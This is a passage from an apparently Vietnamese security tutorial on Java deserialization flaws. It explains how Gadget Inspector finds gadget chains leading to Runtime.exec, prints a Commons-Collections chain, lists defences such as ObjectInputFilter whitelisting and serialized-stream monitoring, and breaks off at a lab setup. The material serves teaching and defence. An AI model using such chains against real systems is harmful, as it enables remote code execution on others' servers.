data-size="9">YSoSerial</span></strong><span data-position="39689" data-size="88"> nhưng trên thực tế không phải lúc nào cũng sử dụng các thư viện quen thuộc có trong bộ </span><strong data-position="39777" data-size="0"><span data-position="39779" data-size="17">công cụ YSoSerial</span></strong><span data-position="39799" data-size="39">. Vì vậy, việc cần một công cụ tự động </span><strong data-position="39837" data-size="0"><span data-position="39839" data-size="48">phân tích tĩnh bytecode Java để tìm gadget chain</span></strong><span data-position="39889" data-size="26"> nhằm phát hiện các chuỗi </span><strong data-position="39915" data-size="0"><span data-position="39917" data-size="12">gadget chain</span></strong><span data-position="39931" data-size="29"> tiềm năng là điều cần thiết.</span></p><p class="part" data-startline="563" data-endline="563" data-position="39962" data-size="0"><span data-position="39962" data-size="28">Mục đích của công cụ này là:</span></p><ul class="part" data-startline="564" data-endline="569" data-position="39991" data-size="0">
<li class="" data-startline="564" data-endline="564" data-position="39993" data-size="0"><strong data-position="39993" data-size="0"><span data-position="39995" data-size="33">Tự động khám phá gadget chain mới</span></strong><span data-position="40030" data-size="65"> trong ứng dụng hoặc thư viện custom mà không có trong YSoSerial.</span></li>
<li class="" data-startline="565" data-endline="565" data-position="40098" data-size="0"><strong data-position="40098" data-size="0"><span data-position="40100" data-size="27">Tự động phân tích classpath</span></strong><span data-position="40129" data-size="47"> (các file .jar, .war) mà không cần code nguồn.</span></li>
<li class="" data-startline="566" data-endline="566" data-position="40179" data-size="0"><strong data-position="40179" data-size="0"><span data-position="40181" data-size="24">Phát hiện source và sink</span></strong><span data-position="40207" data-size="29"> trong quá trình deserialize.</span></li>
<li class="" data-startline="567" data-endline="567" data-position="40239" data-size="0"><strong data-position="40239" data-size="0"><span data-position="40241" data-size="18">Tạo báo cáo chain:</span></strong><span data-position="40261" data-size="12"> kết nối từ </span><strong data-position="40273" data-size="0"><span data-position="40275" data-size="6">source</span></strong><span data-position="40283" data-size="17"> (điểm entry như </span><code data-position="40303" data-size="13">readObject())</code><span data-position="40319" data-size="5"> đến </span><strong data-position="40324" data-size="0"><span data-position="40326" data-size="4">sink</span></strong><span data-position="40332" data-size="23"> (method nguy hiểm như </span><code data-position="40358" data-size="14">Runtime.exec()</code><span data-position="40375" data-size="1">)</span></li>
<li class="" data-startline="568" data-endline="569" data-position="40379" data-size="0"><strong data-position="40379" data-size="0"><span data-position="40381" data-size="26">Rút ngắn thời gian pentest</span></strong><span data-position="40410" data-size="53">, giúp tập trung vào chain có khả năng khai thác cao.</span></li>
</ul><p class="part" data-startline="570" data-endline="571" data-position="40464" data-size="0"><span data-position="40464" data-size="76">Giờ mình sẽ đi sâu một chút về chức năng của công cụ này cho mọi người hiểu:</span><br>
<strong data-position="40541" data-size="0"><span data-position="40543" data-size="44">1. Phân tích tĩnh bytecode (Static Analysis)</span></strong></p><ul class="part" data-startline="572" data-endline="574" data-position="40590" data-size="0">
<li class="" data-startline="572" data-endline="572" data-position="40592" data-size="0"><strong data-position="40592" data-size="0"><span data-position="40594" data-size="24">Công cụ Gadget Inspector</span></strong><span data-position="40620" data-size="54"> không cần mã nguồn mà có thể làm việc trực tiếp trên </span><strong data-position="40674" data-size="0"><span data-position="40676" data-size="10">class file</span></strong><span data-position="40688" data-size="6"> hoặc </span><strong data-position="40694" data-size="0"><span data-position="40696" data-size="11">JAR/WAR/EAR</span></strong><span data-position="40710" data-size="1">.</span></li>
<li class="" data-startline="573" data-endline="574" data-position="40713" data-size="0"><span data-position="40713" data-size="118">Công cụ đọc bytecode, sau đó xây dựng một** call graph** (đồ thị gọi phương thức) để hiểu luồng thực thi của chương trình.</span></li>
</ul><p class="part" data-startline="575" data-endline="575" data-position="40837" data-size="0"><strong data-position="40837" data-size="0"><span data-position="40839" data-size="19">2. Phát hiện Source</span></strong></p><ul class="part" data-startline="576" data-endline="578" data-position="40861" data-size="0">
<li class="" data-startline="576" data-endline="576" data-position="40863" data-size="0"><span data-position="40863" data-size="33">Gadget Inspector tự động tìm các </span><strong data-position="40896" data-size="0"><span data-position="40898" data-size="12">entry points</span></strong><span data-position="40912" data-size="57"> (nơi dữ liệu được nhập vào trong quá trình deserialize).</span></li>
<li class="" data-startline="577" data-endline="578" data-position="40972" data-size="0"><span data-position="40972" data-size="14">Ví dụ như các </span><strong data-position="40986" data-size="0"><span data-position="40988" data-size="18">Java magic methods</span></strong><span data-position="41008" data-size="5"> như </span><code data-position="41016" data-size="32">readObject(ObjectInputStream in)</code><span data-position="41052" data-size="2">, </span><code data-position="41056" data-size="13">readResolve()</code><span data-position="41073" data-size="2">, </span><code data-position="41077" data-size="8">equals()</code><span data-position="41089" data-size="2">, </span><code data-position="41093" data-size="10">hashCode()</code><span data-position="41107" data-size="1">,</span><code data-position="41110" data-size="11"> toString()</code><span data-position="41125" data-size="50">, đây là những nơi payload của mình có thể đi vào.</span></li>
</ul><p class="part" data-startline="579" data-endline="579" data-position="41176" data-size="0"><strong data-position="41176" data-size="0"><span data-position="41178" data-size="17">3. Phát hiện Sink</span></strong></p><ul class="part" data-startline="580" data-endline="582" data-position="41198" data-size="0">
<li class="" data-startline="580" data-endline="580" data-position="41200" data-size="0"><span data-position="41200" data-size="21">Công cụ dò tìm những </span><strong data-position="41221" data-size="0"><span data-position="41223" data-size="13">API nguy hiểm</span></strong><span data-position="41238" data-size="45"> mà chúng ta có thể lợi dụng (thường là RCE).</span></li>
<li class="" data-startline="581" data-endline="582" data-position="41286" data-size="0"><span data-position="41286" data-size="28">Một số sink phổ biến như là:</span><code data-position="41317" data-size="74">Runtime.getRuntime().exec(...), ProcessBuilder.start(), Method.invoke(...)</code><span data-position="41394" data-size="19"> (Java Reflection),</span><code data-position="41416" data-size="32">Class.forName(...).newInstance()</code><span data-position="41452" data-size="1">.</span></li>
</ul><p class="part" data-startline="583" data-endline="583" data-position="41454" data-size="0"><strong data-position="41454" data-size="0"><span data-position="41456" data-size="30">4. Tìm đường dẫn Source → Sink</span></strong></p><ul class="part" data-startline="584" data-endline="585" data-position="41489" data-size="0">
<li class="" data-startline="584" data-endline="584" data-position="41491" data-size="0"><span data-position="41491" data-size="27">Chức năng quan trọng nhất: </span><strong data-position="41518" data-size="0"><span data-position="41520" data-size="16">Gadget Inspector</span></strong><span data-position="41538" data-size="41"> sẽ tự động nối các method lại để tìm ra </span><strong data-position="41579" data-size="0"><span data-position="41581" data-size="12">gadget chain</span></strong><span data-position="41596" data-size="55">.(nhưng sau đấy chúng ta vẫn cần kiểm tra thủ công lại)</span></li>
<li class="" data-startline="585" data-endline="585" data-position="41653" data-size="0"><span data-position="41653" data-size="37">Ví dụ output có thể chỉ ra chuỗi như:</span></li>
</ul><div class="part code-block-wrapper code-block-toolbar-handled" data-startline="586" data-endline="588" data-infoprefix-length="4" data-position="41691"><div class="code-toolbar"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-clipboard-text" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div>
        <pre class="click-event-handled"><code class="java hljs">readObject → <span class="token class-name">HashMap</span><span class="token punctuation">.</span>put → <span class="token class-name">Transformer</span><span class="token punctuation">.</span>transform → <span class="token class-name">Method</span><span class="token punctuation">.</span>invoke → <span class="token class-name">Runtime</span><span class="token punctuation">.</span>exec
</code></pre>
      </div><ul class="part" data-startline="589" data-endline="590" data-position="41783" data-size="0">
<li class="" data-startline="589" data-endline="590" data-position="41785" data-size="0"><span data-position="41785" data-size="40">Lúc này chúng ta đã có thể xác định cần </span><strong data-position="41825" data-size="0"><span data-position="41827" data-size="14">inject payload</span></strong><span data-position="41843" data-size="33"> vào đâu để chain được kích hoạt.</span></li>
</ul><p class="part" data-startline="591" data-endline="591" data-position="41878" data-size="0"><strong data-position="41878" data-size="0"><span data-position="41880" data-size="28">5. Xác định Reflection Usage</span></strong></p><ul class="part" data-startline="592" data-endline="594" data-position="41911" data-size="0">
<li class="" data-startline="592" data-endline="592" data-position="41913" data-size="0"><strong data-position="41913" data-size="0"><span data-position="41915" data-size="16">Gadget Inspector</span></strong><span data-position="41933" data-size="73"> rất đặt biệt hữu ích giúp chúng ta dễ dàng phát hiện các đoạn code dùng </span><strong data-position="42006" data-size="0"><span data-position="42008" data-size="10">Reflection</span></strong><span data-position="42021" data-size="87">, nó sẽ tạo bước ngoặc khác giúp chúng ta gọi gián tiếp đến các lệnh ví dụ như là exec.</span></li>
<li class="" data-startline="593" data-endline="594" data-position="42110" data-size="0"><strong data-position="42110" data-size="0"><span data-position="42112" data-size="16">Gadget Inspector</span></strong><span data-position="42130" data-size="43"> sẽ highlight (tô sáng) những đoạn code có </span><strong data-position="42173" data-size="0"><span data-position="42175" data-size="10">Reflection</span></strong><span data-position="42187" data-size="64"> giúp chúng ta sẽ đỡ tốn thời gian đọc bytecode thủ công để tìm </span><code data-position="42254" data-size="13">Method.invoke</code><span data-position="42271" data-size="75">, mà chúng ta chỉ cần quét và tìm được  chính xác file, class, method chứa </span><strong data-position="42345" data-size="0"><span data-position="42347" data-size="10">Reflection</span></strong><span data-position="42360" data-size="1">.</span></li>
</ul><p class="part" data-startline="595" data-endline="595" data-position="42362" data-size="0"><strong data-position="42362" data-size="0"><span data-position="42364" data-size="39">6. Hỗ trợ kiểm tra Custom Gadget Chains</span></strong></p><ul class="part" data-startline="596" data-endline="597" data-position="42406" data-size="0">
<li class="" data-startline="596" data-endline="597" data-position="42408" data-size="0"><span data-position="42408" data-size="47">Như nãy mình đã nói, thay vì chúng ta khi dùng </span><strong data-position="42455" data-size="0"><span data-position="42457" data-size="9">YSoSerial</span></strong><span data-position="42468" data-size="67"> chỉ có một tập payload cố định (hoặc đợi người khác bổ sung), thì </span><strong data-position="42535" data-size="0"><span data-position="42537" data-size="16">Gadget Inspector</span></strong><span data-position="42555" data-size="18"> tìm ra được  các </span><strong data-position="42573" data-size="0"><span data-position="42575" data-size="12">gatget chain</span></strong><span data-position="42589" data-size="21"> mới không nằm trong </span><strong data-position="42610" data-size="0"><span data-position="42612" data-size="9">YSoSerial</span></strong><span data-position="42624" data-size="103">, chúng ta có thể dễ dàng dựng custom payload để khó phát hiện hơn, thậm chí là có thể tìm ra zero-day.</span></li>
</ul><p class="part" data-startline="598" data-endline="598" data-position="42728" data-size="0"><strong data-position="42728" data-size="0"><span data-position="42730" data-size="29">7. Xuất Báo Cáo Gadget Chains</span></strong></p><ul class="part" data-startline="599" data-endline="600" data-position="42762" data-size="0">
<li class="" data-startline="599" data-endline="599" data-position="42764" data-size="0"><span data-position="42764" data-size="87">Đây có thể coi một trong những tính năng giúp chúng ta dễ dàng hiểu rõ và tìm kiếm các </span><strong data-position="42851" data-size="0"><span data-position="42853" data-size="12">gadget chain</span></strong><span data-position="42868" data-size="26">, và dễ dàng dựng lại PoC.</span></li>
<li class="" data-startline="600" data-endline="600" data-position="42896" data-size="0"><strong data-position="42896" data-size="0"><span data-position="42898" data-size="16">Gadget Inspector</span></strong><span data-position="42916" data-size="17"> sẽ xuất một bản </span><strong data-position="42933" data-size="0"><span data-position="42935" data-size="16">báo cáo chi tiết</span></strong><span data-position="42954" data-size="45">, thường dưới dạng file text hoặc JSON chứa: </span><strong data-position="42998" data-size="0"><span data-position="43000" data-size="16">danh sách source</span></strong><span data-position="43019" data-size="2">, </span><strong data-position="43020" data-size="0"><span data-position="43022" data-size="14">danh sách sink</span></strong><span data-position="43039" data-size="2">, </span><strong data-position="43040" data-size="0"><span data-position="43042" data-size="15">đường dẫn chain</span></strong><span data-position="43060" data-size="20">(call graph). ví dụ:</span></li>
</ul><div class="part code-block-wrapper code-block-toolbar-handled" data-startline="601" data-endline="614" data-infoprefix-length="4" data-position="43080"><div class="code-toolbar"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-clipboard-text" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div>
        <pre class="click-event-handled"><code class="yaml hljs"><span class="token key atrule">Source</span><span class="token punctuation">:</span> java.util.HashMap.readObject(ObjectInputStream)
<span class="token punctuation">|</span>
v
org.apache.commons.collections.functors.InvokerTransformer.transform(Object)
<span class="token punctuation">|</span>
v
java.lang.reflect.Method.invoke(Object<span class="token punctuation">,</span> Object<span class="token punctuation">[</span><span class="token punctuation">]</span>)
<span class="token punctuation">|</span>
v
java.lang.Runtime.exec(String)
<span class="token key atrule">Sink</span><span class="token punctuation">:</span> Runtime.exec

</code></pre>
      </div><p class="part" data-startline="616" data-endline="618" data-position="43339" data-size="0"><span data-position="43339" data-size="11">Tham khảo: </span><a href="https://www.synacktiv.com/sites/default/files/2022-07/PTS2022-Talk-20-Finding-Java-deserialization-gadgets-with-CodeQL.pdf" target="_blank" rel="noopener"><span data-position="43351" data-size="9">synacktiv</span></a><span data-position="43486" data-size="2">, </span><a href="https://sheon.hashnode.dev/java-security-3-cong-cu-gadget-inspector?source=more_series_bottom_blogs" target="_blank" rel="noopener"><span data-position="43488" data-size="5">Sheon</span><br>
</a><span data-position="43597" data-size="2">, </span><a href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf" target="_blank" rel="noopener"><span data-position="43599" data-size="76">Slide của bài trình bày Automated Discovery of Deserialization Gadget Chains</span></a><span data-position="43789" data-size="1">,</span><a href="https://viblo.asia/p/gadget-inspector-101-7ymJXnnRVkq" target="_blank" rel="noopener"><br>
<span data-position="43791" data-size="7">Tri Luu</span></a></p><h3 class="part" data-startline="620" data-endline="620" id="11-Cách-ngăn-chặn-Java-Deserialization-vulnerability" data-id="11-Cách-ngăn-chặn-Java-Deserialization-vulnerability"><a class="anchor hidden-xs" href="https://hackmd.io/@nhat015/HktihBmLxl#11-C%C3%A1ch-ng%C4%83n-ch%E1%BA%B7n-Java-Deserialization-vulnerability" title="11-Cách-ngăn-chặn-Java-Deserialization-vulnerability" data-size="53" data-position="43860" smoothhashscroll=""><span class="octicon octicon-link ph ph-link-simple-horizontal"></span></a><span data-position="43860" data-size="53">11. Cách ngăn chặn Java Deserialization vulnerability</span></h3><p class="part" data-startline="621" data-endline="623" data-position="43914" data-size="0"><strong data-position="43914" data-size="0"><span data-position="43916" data-size="15">Deserialization</span></strong><span data-position="43933" data-size="235"> trong Java là một tính năng mạnh mẽ, nhưng nếu sử dụng sai cách, nó có thể mở cửa cho kẻ tấn công thực thi mã tùy ý hoặc thao túng logic ứng dụng. Để giảm thiểu rủi ro, cần áp dụng nhiều lớp phòng thủ thay vì chỉ một biện pháp đơn lẻ.</span><br>
<strong data-position="44169" data-size="0"><span data-position="44171" data-size="49">1. Loại bỏ hoặc Hạn chế Java Native Serialization</span></strong><br>
<span data-position="44223" data-size="33">Cách phòng ngừa hiệu quả nhất là </span><strong data-position="44256" data-size="0"><span data-position="44258" data-size="34">không sử dụng native serialization</span></strong><span data-position="44294" data-size="52"> (ObjectInputStream) cho dữ liệu nhận từ người dùng.</span></p><ul class="part" data-startline="624" data-endline="626" data-position="44347" data-size="0">
<li class="" data-startline="624" data-endline="624" data-position="44349" data-size="0"><span data-position="44349" data-size="40">Thay thế bằng định dạng an toàn hơn như </span><strong data-position="44389" data-size="0"><span data-position="44391" data-size="32">JSON (Jackson, Gson), XML (JAXB)</span></strong><span data-position="44426" data-size="1">.</span></li>
<li class="" data-startline="625" data-endline="626" data-position="44429" data-size="0"><span data-position="44429" data-size="70">Các định dạng này không cho phép tiêm class tùy ý → giảm thiểu rủi ro </span><strong data-position="44499" data-size="0"><span data-position="44501" data-size="12">gadget chain</span></strong><span data-position="44516" data-size="1">.</span></li>
</ul><p class="part" data-startline="627" data-endline="627" data-position="44518" data-size="0"><span data-position="44518" data-size="11">Tham khảo: </span><a href="https://portswigger.net/web-security/deserialization#how-to-prevent-insecure-deserialization-vulnerabilities" target="_blank" rel="noopener"><span data-position="44530" data-size="11">portswigger</span></a><span data-position="44653" data-size="1">.</span></p><p class="part" data-startline="629" data-endline="630" data-position="44655" data-size="0"><strong data-position="44655" data-size="0"><span data-position="44657" data-size="45">2. Sử dụng Serialization Filtering (Java ≥ 9)</span></strong><br>
<span data-position="44705" data-size="94">Java 9 giới thiệu ObjectInputFilter cho phép kiểm soát class nào được phép deserialize. Ví dụ:</span></p><div class="part code-block-wrapper code-block-toolbar-handled" data-startline="631" data-endline="635" data-infoprefix-length="4" data-position="44800"><div class="code-toolbar"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-clipboard-text" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div>
        <pre class="click-event-handled"><code class="java hljs"><span class="token class-name">ObjectInputFilter</span> filter <span class="token operator">=</span> <span class="token class-name">ObjectInputFilter<span class="token punctuation">.</span>Config</span><span class="token punctuation">.</span><span class="token function">createFilter</span><span class="token punctuation">(</span><span class="token string">"com.myapp.*;!*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>in<span class="token punctuation">)</span><span class="token punctuation">;</span>
ois<span class="token punctuation">.</span><span class="token function">setObjectInputFilter</span><span class="token punctuation">(</span>filter<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
      </div><p class="part" data-startline="636" data-endline="637" data-position="44981" data-size="0"><span data-position="44981" data-size="27">Ở đây, chỉ các class trong </span><code data-position="45011" data-size="9">com.myapp</code><span data-position="45023" data-size="50"> được phép deserialize, các class khác bị từ chối.</span><br>
<strong data-position="45074" data-size="0"><span data-position="45076" data-size="9">Tác dụng:</span></strong><span data-position="45087" data-size="58"> Loại bỏ khả năng bị inject payload từ thư viện bên ngoài.</span></p><p class="part" data-startline="639" data-endline="639" data-position="45147" data-size="0"><span data-position="45147" data-size="11">Tham khảo: </span><a href="https://docs.oracle.com/javase/9/docs/api/java/io/ObjectInputFilter.html" target="_blank" rel="noopener"><span data-position="45159" data-size="41">Oracle Documentation on ObjectInputFilter</span></a></p><p class="part" data-startline="641" data-endline="642" data-position="45277" data-size="0"><strong data-position="45277" data-size="0"><span data-position="45279" data-size="35">3. Whitelist Class Một Cách Rõ Ràng</span></strong><br>
<span data-position="45317" data-size="26">Nếu bắt buộc phải sử dụng </span><strong data-position="45343" data-size="0"><span data-position="45345" data-size="20">native serialization</span></strong><span data-position="45368" data-size="1">:</span></p><ul class="part" data-startline="643" data-endline="645" data-position="45369" data-size="0">
<li class="" data-startline="643" data-endline="643" data-position="45371" data-size="0"><span data-position="45371" data-size="8">Áp dụng </span><strong data-position="45379" data-size="0"><span data-position="45381" data-size="9">whitelist</span></strong><span data-position="45392" data-size="38"> để chỉ cho phép một tập class cụ thể.</span></li>
<li class="" data-startline="644" data-endline="645" data-position="45433" data-size="0"><span data-position="45433" data-size="75">Không bao giờ deserialize dữ liệu từ client mà không có xác thực nguồn gốc.</span></li>
</ul><p class="part" data-startline="646" data-endline="647" data-position="45510" data-size="0"><strong data-position="45510" data-size="0"><span data-position="45512" data-size="25">4. Giới hạn Quyền của JVM</span></strong><br>
<span data-position="45540" data-size="87">Dù payload có được tiêm, hạn chế quyền của JVM có thể giảm mức độ thiệt hại. Ví dụ như:</span></p><ul class="part" data-startline="648" data-endline="651" data-position="45628" data-size="0">
<li class="" data-startline="648" data-endline="648" data-position="45630" data-size="0"><span data-position="45630" data-size="20">Chạy ứng dụng trong </span><strong data-position="45650" data-size="0"><span data-position="45652" data-size="9">container</span></strong><span data-position="45663" data-size="6"> hoặc </span><strong data-position="45669" data-size="0"><span data-position="45671" data-size="7">sandbox</span></strong><span data-position="45681" data-size="1">.</span></li>
<li class="" data-startline="649" data-endline="649" data-position="45684" data-size="0"><span data-position="45684" data-size="8">Sử dụng </span><strong data-position="45692" data-size="0"><span data-position="45694" data-size="16">Security Manager</span></strong><span data-position="45712" data-size="52"> (Java ≤17) hoặc cơ chế kiểm soát quyền tương đương.</span></li>
<li class="" data-startline="650" data-endline="651" data-position="45767" data-size="0"><span data-position="45767" data-size="25">Vô hiệu hóa khả năng gọi </span><code data-position="45795" data-size="12">Runtime.exec</code><span data-position="45810" data-size="21"> nếu không cần thiết.</span></li>
</ul><p class="part" data-startline="652" data-endline="652" data-position="45833" data-size="0"><span data-position="45833" data-size="10">Tham khảo:</span><a href="https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data" target="_blank" rel="noopener"><span data-position="45844" data-size="32">OWASP - Insecure Deserialization</span></a></p><p class="part" data-startline="654" data-endline="655" data-position="45962" data-size="0"><strong data-position="45962" data-size="0"><span data-position="45964" data-size="31">5. Cập nhật Thư viện Bên Thứ Ba</span></strong><br>
<span data-position="45998" data-size="58">Rất nhiều gadget chain khai thác từ thư viện phổ biến như </span><strong data-position="46056" data-size="0"><span data-position="46058" data-size="35">Commons-Collections, Groovy, Spring</span></strong><span data-position="46095" data-size="5"> nên:</span></p><ul class="part" data-startline="656" data-endline="658" data-position="46101" data-size="0">
<li class="" data-startline="656" data-endline="656" data-position="46103" data-size="0"><span data-position="46103" data-size="48">Luôn cập nhật dependency lên phiên bản mới nhất.</span></li>
<li class="" data-startline="657" data-endline="658" data-position="46154" data-size="0"><span data-position="46154" data-size="32">Sử dụng công cụ quét dependency:</span><a href="https://owasp.org/www-project-dependency-check/" target="_blank" rel="noopener"><span data-position="46187" data-size="22">OWASP Dependency-Check</span></a><span data-position="46260" data-size="2">, </span><a href="https://snyk.io/" target="_blank" rel="noopener"><span data-position="46262" data-size="4">Snyk</span></a></li>
</ul><p class="part" data-startline="659" data-endline="660" data-position="46287" data-size="0"><strong data-position="46287" data-size="0"><span data-position="46289" data-size="30">6. Kiểm tra và Pentest Định Kỳ</span></strong><br>
<span data-position="46322" data-size="110">Kiểm tra vè pentest hệ thống định kì, kết hợp dùng một số tool như mình đã chỉ để quét source code và tìm các </span><strong data-position="46432" data-size="0"><span data-position="46434" data-size="22">gadget chain tiềm năng</span></strong><span data-position="46459" data-size="1">.</span></p><p class="part" data-startline="662" data-endline="663" data-position="46461" data-size="0"><strong data-position="46461" data-size="0"><span data-position="46463" data-size="22">7. Giám sát và Logging</span></strong><br>
<span data-position="46488" data-size="68">Triển khai giám sát traffic và log nhằm phát hiện payload nguy hiểm:</span></p><ul class="part" data-startline="664" data-endline="667" data-position="46557" data-size="0">
<li class="" data-startline="664" data-endline="664" data-position="46559" data-size="0"><span data-position="46559" data-size="41">Nếu thấy request chứa chuỗi bắt đầu bằng </span><code data-position="46603" data-size="11">AC ED 00 05</code><span data-position="46617" data-size="44"> (STREAM_MAGIC) → nghi ngờ dữ liệu serialize.</span></li>
<li class="" data-startline="665" data-endline="665" data-position="46665" data-size="0"><span data-position="46665" data-size="44">Sử dụng IDS/WAF để chặn mẫu payload đã biết.</span></li>
<li class="" data-startline="666" data-endline="667" data-position="46712" data-size="0"><span data-position="46712" data-size="67">Log chi tiết quá trình deserialize để hỗ trợ forensic khi có sự cố.</span></li>
</ul><hr class=""><h2 class="part" data-startline="669" data-endline="669" id="II-DỰNG-MÔI-TRƯỜNG-TEST" data-id="II-DỰNG-MÔI-TRƯỜNG-TEST"><a class="anchor hidden-xs" href="https://hackmd.io/@nhat015/HktihBmLxl#II-D%E1%BB%B0NG-M%C3%94I-TR%C6%AF%E1%BB%9CNG-TEST" title="II-DỰNG-MÔI-TRƯỜNG-TEST" data-size="24" data-position="46788" smoothhashscroll=""><span class="octicon octicon-link ph ph-link-simple-horizontal"></span></a><span data-position="46788" data-size="24">II. DỰNG MÔI TRƯỜNG TEST</span></h2><p class="part" data-startline="670" data-endline="674" data-position="46813" data-size="0"><span data-position="46813" data-size="88">Sau khi xem qua phần lí thuyết xong, chúng ta bắt đầu thực hành, mình đã dựng lại lab ở </span><a href="https://github.com/ASEN-K5/Java-Deserialization-vulnerability-research/blob/main/PoC.rar" target="_blank" rel="noopener"><span data-position="46902" data-size="3">đây</span></a><span data-position="46997" data-size="279">, bạn chỉ cần tải về và chạy docker là được, web sẽ nằm ở port 13337. Sau khi cài xong, chúng ta hãy mở web, Burpsuite và IntelliJ IDEA (đây là IDE mình thấy khá thuận tiện để debug, khá dễ sài và miễn phí cho sinh viên). Đầu tiên chúng ta sẽ mở trang web lên và đọc source code.</span><br>
<span class="image-toolbar-wrapper in-view inline-block w-fit h-fit [&amp;:not([data-image-error])]:cursor-zoom-in" data-position="47276" data-size="51" style="width: auto; height: auto;"><div class="code-toolbar cursor-default tw-hide md:block"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-zoom-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-magnifying-glass-plus" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div><img src="./Những điểu về lỗ hổng Java Deserialization vulnerability - HackMD_files/HJN4ZMAPle.png" alt="image" class="offline-handled error-handled image-toolbar-handled" data-position="47276" data-size="51" loading="lazy" style="width: auto; height: auto;"></span><br>
<span data-position="47328" data-size="94">đây là giao diện của trang web, ta sẽ xem thử các chức năng rồi xem source code của trang web.</span><br>
